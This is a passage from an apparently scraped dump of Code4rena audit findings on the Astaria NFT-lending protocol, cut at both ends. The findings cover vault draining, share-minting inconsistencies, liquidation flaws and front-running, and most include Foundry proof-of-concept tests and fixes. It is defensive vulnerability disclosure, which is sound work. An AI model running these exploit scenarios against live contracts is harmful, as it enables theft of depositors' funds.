_locateCurrentAmount(         orders[0].parameters.consideration[0].startAmount,         orders[0].parameters.consideration[0].endAmount,         orders[0].parameters.startTime,         orders[0].parameters.endTime,         false       );       emit log_named_uint(\"currentAmount asset\", currentAmount);       uint256 currentAmountFee = _locateCurrentAmount(         orders[0].parameters.consideration[1].startAmount,         orders[0].parameters.consideration[1].endAmount,         orders[0].parameters.startTime,         orders[0].parameters.endTime,         false       );       emit log_named_uint(\"currentAmount fee\", currentAmountFee);       emit log_fills(fulfillments);       emit log_named_uint(\"length\", fulfillments.length);        consideration.matchOrders(orders, fulfillments);     } else {       consideration.fulfillAdvancedOrder(         AdvancedOrder(orders[0].parameters, 1, 1, orders[0].signature, \"\"),         new CriteriaResolver[](0),         bidderConduits[incomingBidder.bidder].conduitKey,         address(0)       );     }     delete fulfillments;     vm.stopPrank();   }    function testLiquidationBlockedERC20Transfer() public {     address forbidden = makeAddr(\"forbidden\");     CensorableMockERC20 loanToken = new CensorableMockERC20(forbidden);     loanToken.mint(strategistOne, 50 ether);      address borrower = address(69);     address liquidator = address(7);     TestNFT nft = new TestNFT(0);     _mintNoDepositApproveRouterSpecific(borrower, address(nft), 99);     address tokenContract = address(nft);     uint256 tokenId = uint256(99);      address privateVault = _createPrivateERC20Vault({       strategist: strategistOne,       delegate: strategistTwo,       token: address(loanToken)     });      _lendToPrivateERC20Vault(       Lender({addr: strategistOne, amountToLend: 50 ether}),       privateVault,       address(loanToken)     );      ILienToken.Details memory lien = standardLienDetails;     lien.duration = 14 days;      vm.startPrank(borrower);     (, ILienToken.Stack[] memory stack) = _commitToLien({       vault: privateVault,       strategist: strategistOne,       strategistPK: strategistOnePK,       tokenContract: tokenContract,       tokenId: tokenId,       lienDetails: standardLienDetails,       amount: 50 ether,       isFirstLien: true     });     vm.stopPrank();      {     uint256 lienTokenId = stack[0].point.lienId;     address lienOwner = ILienToken(LIEN_TOKEN).ownerOf(lienTokenId);     assertEq(lienOwner, strategistOne);      vm.prank(strategistOne);     LIEN_TOKEN.transferFrom(strategistOne, forbidden, lienTokenId);     }      // Borrower cannot make payments     vm.expectRevert(\"TRANSFER_FROM_FAILED\");     this._payERC20(stack, 0, 1 ether, borrower, address(loanToken));     vm.stopPrank();      vm.warp(block.timestamp + lien.duration);      vm.startPrank(liquidator);     OrderParameters memory listedOrder = ASTARIA_ROUTER.liquidate(       stack,       uint8(0)     );     vm.stopPrank();     uint256 bid = 100 ether;      vm.expectRevert(\"TRANSFER_FROM_FAILED\");     this._bidERC20(Bidder(bidder, bidderPK), listedOrder, bid, address(loanToken));     vm.stopPrank();      // Clearing house still owns NFT     assertEq(nft.ownerOf(tokenId), address(COLLATERAL_TOKEN.getClearingHouse(stack[0].lien.collateralId)));      // Liquidator can claim collateral for free     skip(4 days);     vm.prank(liquidator);     COLLATERAL_TOKEN.liquidatorNFTClaim(listedOrder);     assertEq(       nft.ownerOf(tokenId),       liquidator     );      // Borrower still has 50 tokens from lender     assertEq(loanToken.balanceOf(borrower), 50 ether);   } } ``` "}, {"title": "ERC4626Cloned deposit and mint logic differ on first deposit", "html_url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/588", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "upgraded by judge", "H-02"], "target": "2023-01-astaria-findings", "body": "# Lines of code  https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626-Cloned.sol#L123-L127 https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626-Cloned.sol#L129-L133   # Vulnerability details  The `ERC4626Cloned` contract is an implementation of the ERC4626 used for vaults. The standard contains a `deposit` function to deposit a specific amount of the underlying asset, and a `mint` function that will calculate the amount needed of the underlying token to mint a specific number of shares.  This calculation is done in `previewDeposit` and `previewMint`:  https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626-Cloned.sol#L123-L127  ```solidity function previewDeposit(   uint256 assets ) public view virtual returns (uint256) {   return convertToShares(assets); }  function convertToShares(   uint256 assets ) public view virtual returns (uint256) {   uint256 supply = totalSupply(); // Saves an extra SLOAD if totalSupply is non-zero.    return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets()); } ```  https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626-Cloned.sol#L129-L133  ```solidity function previewMint(uint256 shares) public view virtual returns (uint256) {   uint256 supply = totalSupply(); // Saves an extra SLOAD if totalSupply is non-zero.    return supply == 0 ? 10e18 : shares.mulDivUp(totalAssets(), supply); } ```  In the case of the first deposit (i.e. when `supply == 0`), `previewDeposit` will return the same `assets` amount for the shares (this is the standard implementation), while `previewMint` will simply return `10e18`.  ## Impact  It seems the intention was to mint a high initial number of shares on first deposit, so an attacker couldn't mint a low number of shares and manipulate the pool to frontrun an initial depositor.  However, the protocol has failed to replicate this logic in the `deposit` function, as both `deposit` and `mint` logic differ (see PoC).  An attacker can still use the `deposit` function to mint any number of shares.  ## PoC  ```solidity contract MockERC20 is ERC20(\"Mock ERC20\", \"MERC20\", 18) {     function mint(address account, uint256 amount) external {         _mint(account, amount);     } }  contract TestERC4626 is ERC4626Cloned {     ERC20 _asset;      constructor() {         _asset = new MockERC20();     }       function asset() public override view returns (address assetTokenAddress) {         return address(_asset);     }      function minDepositAmount() public override view returns (uint256) {         return 0;     }      function totalAssets() public override view returns (uint256) {         return _asset.balanceOf(address(this));     }      function symbol() external override view returns (string memory) {         return \"TEST4626\";     }     function name() external override view returns (string memory) {         return \"TestERC4626\";     }      function decimals() external override view returns (uint8) {         return 18;     } }  contract AuditTest is Test {     function test_ERC4626Cloned_DepositMintDiscrepancy() public {         TestERC4626 vault = new TestERC4626();         MockERC20 token = MockERC20(vault.asset());          // Amount we deposit         uint256 amount = 25e18;         // Shares we get if we deposit amount         uint256 shares = vault.previewDeposit(amount);         // Amount needed to mint shares         uint256 amountNeeded = vault.previewMint(shares);          // The following values should be equal but they not         assertFalse(amount == amountNeeded);          // An attacker can still mint a single share by using deposit to manipulate the pool         token.mint(address(this), 1);         token.approve(address(vault), type(uint256).max);         uint256 mintedShares = vault.deposit(1, address(this));          assertEq(mintedShares, 1);     } } ```  ## Recommendation  The `deposit` function should also implement the same logic as the `mint` function for the case of the first depositor. "}, {"title": "_buyoutLien() does not properly validate the liquidationInitialAsk", "html_url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/587", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-02"], "target": "2023-01-astaria-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L148-L163   # Vulnerability details  ## Impact Illegal liquidationInitialAsk, resulting in insufficient bids to cover the debt ## Proof of Concept  _buyoutLien() will validate against liquidationInitialAsk, but incorrectly uses the old stack for validation  ```solidity   function _buyoutLien(     LienStorage storage s,     ILienToken.LienActionBuyout calldata params   ) internal returns (Stack[] memory newStack, Stack memory newLien) {  ....      uint256 potentialDebt = 0;     for (uint256 i = params.encumber.stack.length; i > 0; ) {       uint256 j = i - 1;       // should not be able to purchase lien if any lien in the stack is expired (and will be liquidated)       if (block.timestamp >= params.encumber.stack[j].point.end) {         revert InvalidState(InvalidStates.EXPIRED_LIEN);       }        potentialDebt += _getOwed(         params.encumber.stack[j],         params.encumber.stack[j].point.end       );        if (         potentialDebt >         params.encumber.stack[j].lien.details.liquidationInitialAsk   //1.****@audit use old stack       ) {         revert InvalidState(InvalidStates.INITIAL_ASK_EXCEEDED);       }        unchecked {         --i;       }     }   ....     newStack = _replaceStackAtPositionWithNewLien(       s,       params.encumber.stack,       params.position,       newLien,       params.encumber.stack[params.position].point.lienId    //2.****@audit replace newStack     );     ```  ## Tools Used  ## Recommended Mitigation Steps  Replace then verify, using the newStack[] for verification"}, {"title": "settleAuction() Check for status errors", "html_url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/582", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-03"], "target": "2023-01-astaria-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L526-L534   # Vulnerability details  ## Impact ClearingHouse.safeTransferFrom() to execute successfully even if there is no bid  ## Proof of Concept settleAuction is called at the end of the auction and will check if the status is legal  ```solidity    function settleAuction(uint256 collateralId) public {     if (       s.collateralIdToAuction[collateralId] == bytes32(0) &&       ERC721(s.idToUnderlying[collateralId].tokenContract).ownerOf(         s.idToUnderlying[collateralId].tokenId       ) !=       s.clearingHouse[collateralId]     ) {       revert InvalidCollateralState(InvalidCollateralStates.NO_AUCTION);     } ```  This check seems to be miswritten\uff0cThe normal logic would be  ```solidity s.collateralIdToAuction[collateralId] == bytes32(0) || ERC721(s.idToUnderlying[collateralId].tokenContract).ownerOf(         s.idToUnderlying[collateralId].tokenId       ) == s.clearingHouse[collateralId] ```  This causes ClearingHouse.safeTransferFrom() to execute successfully even if there is no bid  ## Tools Used  ## Recommended Mitigation Steps  ```solidity    function settleAuction(uint256 collateralId) public {     if ( -     s.collateralIdToAuction[collateralId] == bytes32(0) && -    ERC721(s.idToUnderlying[collateralId].tokenContract).ownerOf( -        s.idToUnderlying[collateralId].tokenId -      ) != -      s.clearingHouse[collateralId] +      s.collateralIdToAuction[collateralId] == bytes32(0) ||  +       ERC721(s.idToUnderlying[collateralId].tokenContract).ownerOf(s.idToUnderlying[collateralId].tokenId +      ) ==  +      s.clearingHouse[collateralId]     ) {       revert InvalidCollateralState(InvalidCollateralStates.NO_AUCTION);     } ```"}, {"title": "LienToken.transferFrom There is a possibility of malicious attack", "html_url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/571", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-04"], "target": "2023-01-astaria-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L366-L368   # Vulnerability details  ## Impact Corrupt multiple key properties of public vault, causing vault not to function properly  ## Proof of Concept  When LienToken.makePayment()/buyoutLien()/payDebtViaClearingHouse() If it corresponds to PublicVault, it will make multiple changes to the vault, such as: yIntercept, slope, last, epochData, etc.  If LienToken corresponds to PublicVault, then ownerOf(lienId) = PublicVault address  When the LienToken is a private vault, it is possible to transfer the owner of the LienToken.  As the above seems, if the private vault is transferred to the PublicVault address will result in the wrong modification of the yIntercept, slope, last, epochData, etc.  So we restrict the to in transferFrom to not be a PublicVault address  ```solidity    function transferFrom(     address from,     address to,     uint256 id   ) public override(ERC721, IERC721) {      if (_isPublicVault(s, to)) {  //***@audit when to == PublicVault address , will revert       revert InvalidState(InvalidStates.PUBLIC_VAULT_RECIPIENT);       }   ```  However, such a restriction does not prevent an attacker from transferring PrivateVault's LienToken to PublicVault Because the address is predictable when the vault contract is created, a malicious user can predict the vault address, front-run, and transfer PrivateVault's LienToken to the predicted PublicVault address before the public vault is created, thus bypassing this restriction  Assumptions: 1. alice creates PrivateVault, and creates multiple PrivateVault's LienToken 2. alice monitors bob's creation of the PublicVault transaction, i.e., AstariaRouter.newPublicVault(), and then predicts the address of the newly generated treasure chest Note: newPublicVAult() although the use of create(), but still can predict the address  see\uff1ahttps://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed ``` The address for an Ethereum contract is deterministically computed from the address of its creator (sender) and how many transactions the creator has sent (nonce). The sender and nonce are RLP encoded and then hashed with Keccak-256.  ``` 3.front-run , and transfer LienToken to public vault predict address 4.bob's public vault created success and do some loan 5.alice do makePayment() to Corrupt bob's public vault    ## Tools Used  ## Recommended Mitigation Steps  The corresponding vault address is stored in s.lienMeta[id].orginOwner when the LienToken is created, this is not modified. Get the vault address from this variable, not from ownerOf(id)."}, {"title": "Strategist can fail to withdraw asset token from a private vault", "html_url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/489", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-04"], "target": "2023-01-astaria-findings", "body": "# Lines of code  https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626RouterBase.sol#L41-L52 https://github.com/code-423n4/2023-01-astaria/blob/main/src/Vault.sol#L70-L73   # Vulnerability details  ## Impact Calling the `AstariaRouter.withdraw` function calls the following `ERC4626RouterBase.withdraw` function; however, calling `ERC4626RouterBase.withdraw` function for a private vault reverts because the `Vault` contract does not have an `approve` function. Directly calling the `Vault.withdraw` function for a private vault can also revert since the `Vault` contract does not have a way to set the allowance for itself to transfer the asset token, which can cause many ERC20 tokens' `transferFrom` function calls to revert when deducting the transfer amount from the allowance. Hence, after depositing some of the asset token in a private vault, the strategist can fail to withdraw this asset token from this private vault and lose this deposit.  https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626RouterBase.sol#L41-L52 ```solidity   function withdraw(     IERC4626 vault,     address to,     uint256 amount,     uint256 maxSharesOut   ) public payable virtual override returns (uint256 sharesOut) {      ERC20(address(vault)).safeApprove(address(vault), amount);     if ((sharesOut = vault.withdraw(amount, to, msg.sender)) > maxSharesOut) {       revert MaxSharesError();     }   } ```  https://github.com/code-423n4/2023-01-astaria/blob/main/src/Vault.sol#L70-L73 ```solidity   function withdraw(uint256 amount) external {     require(msg.sender == owner());     ERC20(asset()).safeTransferFrom(address(this), msg.sender, amount);   } ```  ## Proof of Concept Please add the following test in `src\\test\\AstariaTest.t.sol`. This test will pass to demonstrate the described scenario.  ```solidity   function testPrivateVaultStrategistIsUnableToWithdraw() public {     uint256 amountToLend = 50 ether;     vm.deal(strategistOne, amountToLend);      address privateVault = _createPrivateVault({       strategist: strategistOne,       delegate: strategistTwo     });      vm.startPrank(strategistOne);      WETH9.deposit{value: amountToLend}();     WETH9.approve(privateVault, amountToLend);      // strategistOne deposits 50 ether WETH to privateVault     Vault(privateVault).deposit(amountToLend, strategistOne);      // calling router's withdraw function for withdrawing assets from privateVault reverts     vm.expectRevert(bytes(\"APPROVE_FAILED\"));     ASTARIA_ROUTER.withdraw(       IERC4626(privateVault),       strategistOne,       amountToLend,       type(uint256).max     );      // directly withdrawing various asset amounts from privateVault also fails     vm.expectRevert(bytes(\"TRANSFER_FROM_FAILED\"));     Vault(privateVault).withdraw(amountToLend);      vm.expectRevert(bytes(\"TRANSFER_FROM_FAILED\"));     Vault(privateVault).withdraw(1);      vm.stopPrank();   } ```  ## Tools Used VSCode  ## Recommended Mitigation Steps https://github.com/code-423n4/2023-01-astaria/blob/main/src/Vault.sol#L72 can be updated to the following code.  ```solidity     ERC20(asset()).safeTransfer(msg.sender, amount); ```"}, {"title": "For a public vault, minimum deposit requirement that is enforced by `ERC4626Cloned.deposit` function can be bypassed by `ERC4626Cloned.mint` function or vice versa when share price does not equal one", "html_url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/486", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-06"], "target": "2023-01-astaria-findings", "body": "# Lines of code  https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626-Cloned.sol#L19-L36 https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626-Cloned.sol#L38-L52   # Vulnerability details  ## Impact The following `ERC4626Cloned.deposit` function has `require(shares > minDepositAmount(), \"VALUE_TOO_SMALL\")` as the minimum deposit requirement, and the `ERC4626Cloned.mint` function below has `require(assets > minDepositAmount(), \"VALUE_TOO_SMALL\")` as the minimum deposit requirement. For a public vault, when the share price becomes different than 1, these functions' minimum deposit requirements are no longer the same. For example, given `S` is the `shares` input value for the `ERC4626Cloned.mint` function and `A` equals `ERC4626Cloned.previewMint(S)`, when the share price is bigger than 1 and `A` equals `minDepositAmount() + 1`, such `A` will violate the `ERC4626Cloned.deposit` function's minimum deposit requirement but the corresponding `S` will not violate the `ERC4626Cloned.mint` function's minimum deposit requirement; in this case, the user can just ignore the `ERC4626Cloned.deposit` function and call `ERC4626Cloned.mint` function to become a liquidity provider. Thus, when the public vault's share price is different than 1, the liquidity provider can call the less restrictive function out of the two so the minimum deposit requirement enforced by one of the two functions is not effective at all; this can result in unexpected deposit amounts and degraded filtering of who can participate as a liquidity provider.  https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626-Cloned.sol#L19-L36 ```solidity   function deposit(uint256 assets, address receiver)     public     virtual     returns (uint256 shares)   {     // Check for rounding error since we round down in previewDeposit.     require((shares = previewDeposit(assets)) != 0, \"ZERO_SHARES\");      require(shares > minDepositAmount(), \"VALUE_TOO_SMALL\");     // Need to transfer before minting or ERC777s could reenter.     ERC20(asset()).safeTransferFrom(msg.sender, address(this), assets);      _mint(receiver, shares);      ...   } ```  https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626-Cloned.sol#L38-L52 ```solidity   function mint(     uint256 shares,     address receiver   ) public virtual returns (uint256 assets) {     assets = previewMint(shares); // No need to check for rounding error, previewMint rounds up.     require(assets > minDepositAmount(), \"VALUE_TOO_SMALL\");     // Need to transfer before minting or ERC777s could reenter.     ERC20(asset()).safeTransferFrom(msg.sender, address(this), assets);      _mint(receiver, shares);      ...   } ```  ## Proof of Concept Please add the following test in `src\\test\\AstariaTest.t.sol`. This test will pass to demonstrate the described scenario.  ```solidity   function testMinimumDepositRequirementForPublicVaultThatIsEnforcedByDepositFunctionCanBeBypassedByMintFunctionOfERC4626ClonedContractWhenSharePriceIsNotOne() public {     uint256 budget = 50 ether;     address alice = address(1);     address bob = address(2);     vm.deal(bob, budget);      TestNFT nft = new TestNFT(2);     _mintNoDepositApproveRouter(address(nft), 5);     address tokenContract = address(nft);     uint256 tokenId = uint256(0);      address publicVault = _createPublicVault({       strategist: strategistOne,       delegate: strategistTwo,       epochLength: 14 days     });      // after alice deposits 50 ether WETH in publicVault, publicVault's share price becomes 1     _lendToVault(Lender({addr: alice, amountToLend: budget}), publicVault);      // the borrower borrows 10 ether WETH from publicVault     (, ILienToken.Stack[] memory stack1) = _commitToLien({       vault: publicVault,       strategist: strategistOne,       strategistPK: strategistOnePK,       tokenContract: tokenContract,       tokenId: tokenId,       lienDetails: standardLienDetails,       amount: 10 ether,       isFirstLien: true     });     uint256 collateralId = tokenContract.computeId(tokenId);      // the borrower repays for the lien after 9 days, and publicVault's share price becomes bigger than 1     vm.warp(block.timestamp + 9 days);     _repay(stack1, 0, 100 ether, address(this));      vm.startPrank(bob);      // bob owns 50 ether WETH     WETH9.deposit{value: budget}();     WETH9.approve(publicVault, budget);      uint256 assetsIn = 100 gwei + 1;      // for publicVault at this moment, 99265705739 shares are equivalent to (100 gwei + 1) WETH according to previewMint function     uint256 sharesIn = IERC4626(publicVault).convertToShares(assetsIn);     assertEq(sharesIn, 99265705739);     assertEq(IERC4626(publicVault).previewMint(sharesIn), assetsIn);          // bob is unable to call publicVault's deposit function for depositing (100 gwei + 1) WETH     vm.expectRevert(bytes(\"VALUE_TOO_SMALL\"));     IERC4626(publicVault).deposit(assetsIn, bob);      // bob is also unable to call publicVault's deposit function for depositing a little more than (100 gwei + 1) WETH     vm.expectRevert(bytes(\"VALUE_TOO_SMALL\"));     IERC4626(publicVault).deposit(assetsIn + 100, bob);      // however, bob is able to call publicVault's mint function for minting 99265705739 shares while transferring (100 gwei + 1) WETH to publicVault     IERC4626(publicVault).mint(sharesIn, bob);      vm.stopPrank();   } ```  ## Tools Used VSCode  ## Recommended Mitigation Steps The `ERC4626Cloned.deposit` function can be updated to directly compare the `assets` input to `minDepositAmount()` for the minimum deposit requirement while keeping the `ERC4626Cloned.mint` function as is. Alternatively, the `ERC4626Cloned.mint` function can be updated to directly compare the `shares` input to `minDepositAmount()` for the minimum deposit requirement while keeping the `ERC4626Cloned.deposit` function as is."}, {"title": "Vault may be drained after a liquidated NFT was claimed by the liquidator", "html_url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/480", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-05"], "target": "2023-01-astaria-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L220-L231   # Vulnerability details  ## Impact The owner of a collateral NFT that was liquidated and then claimed by the liquidator (after the auction had no bids) may drain the vault the loan was taken from. ## Proof of Concept There's an extreme situation when a liquidated and auctioned collateral NFT had no bids and the auction has expired. In this situation, the liquidator may claim the NFT by calling [CollateralToken.liquidatorNFTClaim](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L109). The function: 1. calls [ClearingHouse.settleLiquidatorNFTClaim](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L220) to burn the lien token associated with the loan and clean up the accounting without repaying the actual loan (the loan cannot be repaid since there were no bids); 1. [releases the collateral NFT to the liquidator](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L352).  However, the function doesn't settle the auction. As a result: 1. the `CollateralToken` is not burned ([CollateralToken.sol#L538](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L538)); 1. the link between the collateral ID and the underlying token is not removed ([CollateralToken.sol#L537](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L537)); 1. the link between the collateral ID and the auction is also not removed ([CollateralToken.sol#L544](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L544)).  This allows the owner of the liquidated collateral NFT to create a new lien and take the maximal loan without providing any collateral.  ### Exploit Scenario 1. Alice deposits an NFT token as a collateral and takes a loan. 1. Alice's loan expires and her NFT collateral gets liquidated by Bob. 1. The collateral NFT wasn't sold off auction as there were no bids. 1. Bob claims the collateral NFT and receives it. 1. Alice takes another loan from the vault without providing any collateral.  The following PoC demonstrates the above scenario: ```solidity // src/test/AstariaTest.t.sol function testAuctionEndNoBidsMismanagement_AUDIT() public {   address bob = address(2);   TestNFT nft = new TestNFT(6);   uint256 tokenId = uint256(5);   address tokenContract = address(nft);    // Creating a public vault and providing some liquidity.   address publicVault = _createPublicVault({     strategist: strategistOne,     delegate: strategistTwo,     epochLength: 14 days   });    _lendToVault(Lender({addr: bob, amountToLend: 150 ether}), publicVault);   (, ILienToken.Stack[] memory stack) = _commitToLien({     vault: publicVault,     strategist: strategistOne,     strategistPK: strategistOnePK,     tokenContract: tokenContract,     tokenId: tokenId,     lienDetails: blueChipDetails,     amount: 100 ether,     isFirstLien: true   });    uint256 collateralId = tokenContract.computeId(tokenId);   vm.warp(block.timestamp + 11 days);    // Liquidator liquidates the loan after expiration.   address liquidator = address(0x123);   vm.prank(liquidator);   OrderParameters memory listedOrder = ASTARIA_ROUTER.liquidate(     stack,     uint8(0)   );    // Skipping the auction duration and making no bids.   skip(4 days);    // Liquidator claims the liquidated NFT.   vm.prank(liquidator);   COLLATERAL_TOKEN.liquidatorNFTClaim(listedOrder);   PublicVault(publicVault).processEpoch();    // Liquidator is the rightful owner of the collateral NFT.   assertEq(nft.ownerOf(tokenId), address(liquidator));    // Since the auction wasn't fully settled, the CollateralToken still exists for the collateral NFT.   // The borrower is the owner of the CollateralToken.   assertEq(COLLATERAL_TOKEN.ownerOf(collateralId), address(this));    // WETH balances at this moment:   // 1. the borrower keep holding the 100 ETH it borrowed earlier;   // 2. the vault keeps holding 50 ETH of liquidity.   assertEq(WETH9.balanceOf(address(this)), 100 ether);   assertEq(WETH9.balanceOf(address(publicVault)), 50 ether);    // The borrower creates another lien. This time, the borrower is not the owner of the collateral NFT.   // However, it's still the owner of the CollateralToken.   (, stack) = _commitToLien({     vault: publicVault,     strategist: strategistOne,     strategistPK: strategistOnePK,     tokenContract: tokenContract,     tokenId: tokenId,     lienDetails: blueChipDetails,     amount: 50 ether,     isFirstLien: true   });    // The borrower has taken a loan of 50 ETH from the vault.   assertEq(WETH9.balanceOf(address(this)), 150 ether);   // The vault was drained.   assertEq(WETH9.balanceOf(address(publicVault)), 0 ether); } ``` ## Tools Used Manual review ## Recommended Mitigation Steps Consider settling the auction at the end of `settleLiquidatorNFTClaim`: ```diff diff --git a/src/ClearingHouse.sol b/src/ClearingHouse.sol index 5c2a400..d4ee28d 100644 --- a/src/ClearingHouse.sol +++ b/src/ClearingHouse.sol @@ -228,5 +228,7 @@ contract ClearingHouse is AmountDeriver, Clone, IERC1155, IERC721Receiver {        0,        s.auctionStack.stack      ); +    uint256 collateralId = _getArgUint256(21); +    ASTARIA_ROUTER.COLLATERAL_TOKEN().settleAuction(collateralId);    }  } ```"}, {"title": "Public vault slope can overflow", "html_url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/418", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-10"], "target": "2023-01-astaria-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L562-L568 https://github.com/code-423n4/2023-01-astaria/blob/57c2fe33c1d57bc2814bfd23592417fc4d5bf7de/src/LienToken.sol#L702-L704   # Vulnerability details  ## Impact The slope of public vault can overflow in the afterPayment function due to unchecked addition. When this happens, totalAssets will not be correct. This can also result in underflows in slope updates elsewhere, causing large fluctuations in slope and totalAssets.  ## Proof of Concept Assume the token is a normal 18 decimal ERC20 token.  After 5 loans of 1000 tokens, all with the maximum interest rate of 63419583966, the slope will overflow. 5 * 1000 * 63419583966 / 2^48 = 1.1265581173  ## Tools Used VSCode  ## Recommended Mitigation Steps Remove the unchecked block. Also, I think 48 bits might not be enough for slope."}, {"title": "Lack of StrategyDetailsParam.vault validation allows the borrower to steal all the funds from the vault", "html_url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/409", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-08"], "target": "2023-01-astaria-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-astaria/blob/main/src/VaultImplementation.sol#L287   # Vulnerability details  ## Impact When a borrower takes a loan, Strategy details are passed along with other required data, and through the overall **commitToLien** flow, all the data are validated except the StrategyDetailsParam.vault   ```sh   struct StrategyDetailsParam {     uint8 version;     uint256 deadline;     address vault;   } ```  A borrower then can pass different vault's address, and when creating a lien this  vault is considered. Later, the borrower makes a payment, it reads the asset from this vault. Thus, the borrower can take loans and repay with whatever token.   https://github.com/code-423n4/2023-01-astaria/blob/main/src/LienToken.sol#L849  ### Exploit Scenario  Allow me to describe a scenario where the borrower can steal all the funds from all vaults that support his/her collateral:  1. **Bob** owns an NFT. 2. **Bob** sends his NFT to the collateral token contract. 3. **Bob** creates his own private vault **BobVault** with an asset that he created **FakeToken** which doesn\u2019t have any value in the market (e.g. just a new ERC20 token). 4. **Bob** takes a loan from **Vault1** (while passing **BobVault** in the strategy param). 6. **Bob** pay the loan with his **FakeToken** instead **Vault1**'s asset. 7. **Bob** then repeats the steps from point 4 again till **Vault1** is drained. 8. **Bob** now has all the funds from **Vault1** with **zero** debt. 9. **Strategist** has the same amount of **Vault1**'s funds but in **FakeToken**.  This exploit can be done with other vaults draining all the funds. To prove this, I've coded the scenario below.   ## Proof of Concept   1. Please create a file with a name **StealAllFundsExploit.t.sol** under **src/test/** directory.  2. Add the following code to the file.  ```sh pragma solidity =0.8.17;  import \"forge-std/Test.sol\";  import {Authority} from \"solmate/auth/Auth.sol\"; import {FixedPointMathLib} from \"solmate/utils/FixedPointMathLib.sol\"; import {MockERC721} from \"solmate/test/utils/mocks/MockERC721.sol\"; import {   MultiRolesAuthority } from \"solmate/auth/authorities/MultiRolesAuthority.sol\";  import {ERC721} from \"gpl/ERC721.sol\"; import {SafeCastLib} from \"gpl/utils/SafeCastLib.sol\"; import {IAstariaRouter, AstariaRouter} from \"../AstariaRouter.sol\"; import {VaultImplementation} from \"../VaultImplementation.sol\"; import {PublicVault} from \"../PublicVault.sol\"; import {TransferProxy} from \"../TransferProxy.sol\"; import {WithdrawProxy} from \"../WithdrawProxy.sol\"; import \"./TestHelpers.t.sol\"; import {MockERC20} from \"solmate/test/utils/mocks/MockERC20.sol\"; import {IVaultImplementation} from \"../interfaces/IVaultImplementation.sol\";    contract AstariaTest is TestHelpers {   using FixedPointMathLib for uint256;   using CollateralLookup for address;   using SafeCastLib for uint256;     ILienToken.Details public lienDetails =       ILienToken.Details({         maxAmount: 50 ether,         rate: (uint256(1e16) * 150) / (365 days),         duration: 10 days,         maxPotentialDebt: 50 ether,         liquidationInitialAsk: 500 ether       });     function __createPrivateVault(address strategist, address delegate,address token)     internal     returns (address privateVault)   {     vm.startPrank(strategist);     privateVault = ASTARIA_ROUTER.newVault(delegate, token);     vm.stopPrank();   }          function testPayWithDifferentAsset() public {     TestNFT nft = new TestNFT(2);     address tokenContract = address(nft);     uint256 initialBalance = WETH9.balanceOf(address(this));      // Create a private vault with WETH asset     address privateVault = __createPrivateVault({       strategist: strategistOne,       delegate: address(0),       token: address(WETH9)     });       _lendToPrivateVault(       Lender({addr: strategistOne, amountToLend: 500 ether}),       privateVault     );          // Send the NFT to Collateral contract and receive Collateral token     ERC721(tokenContract).safeTransferFrom(address(this),address(COLLATERAL_TOKEN),1,\"\");      // generate valid terms     uint256 amount 